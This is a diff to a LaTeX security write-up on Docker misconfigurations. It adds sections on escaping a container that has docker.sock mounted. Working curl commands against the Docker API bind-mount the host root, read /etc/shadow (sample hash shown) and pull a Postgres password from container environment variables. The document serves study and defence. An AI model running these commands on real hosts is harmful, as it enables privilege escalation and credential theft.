@@ -10,6 +10,7 @@
 \todo[inline]{Usage of third party Docker images}
 \todo[inline]{\href{https://forums.grsecurity.net/viewtopic.php?f=7&t=2522}{False Boundaries and Arbitrary Code Execution}}
 \todo[inline]{Link to attack scenarios}
+\todo[inline]{\href{https://github.com/ProfessionallyEvil/Pequod/blob/master/pres.md}{Container Hacking or Something Like That}}
 
 \subsection{Docker Permissions}
 A very common (and most notorious) misconfiguration is giving unprivileged users access to Docker. This is very dangerous because this allows the unprivileged users to access all files as \lstinline{root}. The Docker documentation says\cite{Docker-Daemon-Attack-Surface}:
@@ -136,7 +137,7 @@ admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
 The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which is no longer created in newer versions of Docker) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (\lstinline{/etc/shadow}).
 
 \subsection{Docker Engine API}
-The Docker Daemon runs a RESTful\footnote{\url{https://restfulapi.net/}} API that is used to communicate with the Docker Daemon. For example, when an user executes a Docker client command, it actually makes a request to the API. By default the API listens on a UNIX socket accessible through \lstinline{/var/run/docker.sock}, but it also possible to make it listen on a port. This makes it possible for anybody in the \lstinline{docker} group (and \lstinline{root}) to make HTTP requests. For example the following commands (to see all containers) produce the same output (albeit in a different format). The first one is a command using the Docker client and the second is a HTTP request (using \lstinline{curl}\footnote{\url{https://curl.haxx.se/}}).
+The Docker Daemon runs a RESTful\footnote{\url{https://restfulapi.net/}} API\footnote{\url{https://docs.docker.com/engine/api/v1.40/}} that is used to communicate with the Docker Daemon. For example, when an user executes a Docker client command, it actually makes a request to the API. By default the API listens on a UNIX socket accessible through \lstinline{/var/run/docker.sock}, but it also possible to make it listen on a port. This makes it possible for anybody in the \lstinline{docker} group (and \lstinline{root}) to make HTTP requests. For example the following commands (to see all containers) produce the same output (albeit in a different format). The first one is a command using the Docker client and the second is a HTTP request (using \lstinline{curl}\footnote{\url{https://curl.haxx.se/}}).
 \begin{lstlisting}[caption={Docker client and Socket},captionpos=b]
 (host)$ docker ps -a
 ...
@@ -150,12 +151,32 @@ In some cases, it might be possible to access the API when it is not possible to
 However, giving containers access to the API (by adding the socket as a volume) is a common practice, because it allows containers to monitor and analyse other containers.
 
 \subsubsection{Container Escapes}
-\todo[inline]{\href{https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html}{Escaping the Whale: Things you probably shouldn't do with Docker (Part 1)
-}}
-\todo[inline]{\href{https://blog.secureideas.com/2018/08/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-2.html}{Escaping the Whale: Things You Probably Shouldn't Do With Docker (part 2)
-}}
+If the \lstinline{/var/run/docker.sock} is added as a volume to a container, the container has access to the API. This means the process in the container has full access to Docker on the host. This can be used to escape, because the container can create another container with arbitrary volumes and commands. It is even possible to create an interactive shell in another container\cite{Escape-Socket-Shell}.
 
-\subsubsection{Finding Secrets}
+\hfill
+
+Lets say we want to get the password hash of an user called \lstinline{admin} on the host. We are in a container that has access to \lstinline{/var/run/docker.sock}. We use the API to start another Docker container on the host, that has access to the password hash (located in \lstinline{/etc/shadow}). We read the password file, by looking at the logs of the container that we just started.
+
+\begin{lstlisting}
+(host)$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
+(cont)# curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"ubuntu:latest","Cmd":["cat", "/host/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}' "http://localhost/containers/create?name=escape"
+...
+(cont)# curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"
+(cont)# curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"
+...
+admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
+...
+(cont)# curl -XDELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"
+\end{lstlisting}
+
+\subsubsection{Finding Sensitive information}
+
+When a container has access to \lstinline{/var/run/docker.sock} (i.e. \lstinline{/var/run/docker.sock} is added as volume inside the container), it cannot only start new containers but it can also look at the configuration of existing containers. This configuration might contain sensitive information (e.g. passwords in the environment variables).
+
+\hfill
+
+Lets start a Postgres\footnote{\url{https://www.postgresql.org/}} database inside a Docker. From the documentation of the Postgres Docker image\footnote{\url{https://hub.docker.com/_/postgres}}, we know that we can provide a password using the \lstinline{POSTGRES_PASSWORD} environment variable. If we have access to another container which has access to the Docker API, we can read that password from the environment variable.
+
 \begin{lstlisting}[caption={Example extract secrets using the Docker API},captionpos=b]
 (host)$ docker run --name database -e POSTGRES_PASSWORD=thisshouldbesecret -d postgres
 ...
@@ -167,12 +188,7 @@ However, giving containers access to the API (by adding the socket as a volume) 
 (cont)# curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/database/json" | jq -r '.Config.Env'
 [
   "POSTGRES_PASSWORD=thisshouldbesecret",
-  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/postgresql/12/bin",
-  "GOSU_VERSION=1.11",
-  "LANG=en_US.utf8",
-  "PG_MAJOR=12",
-  "PG_VERSION=12.0-2.pgdg100+1",
-  "PGDATA=/var/lib/postgresql/data"
+  ...
 ]
 \end{lstlisting}
 
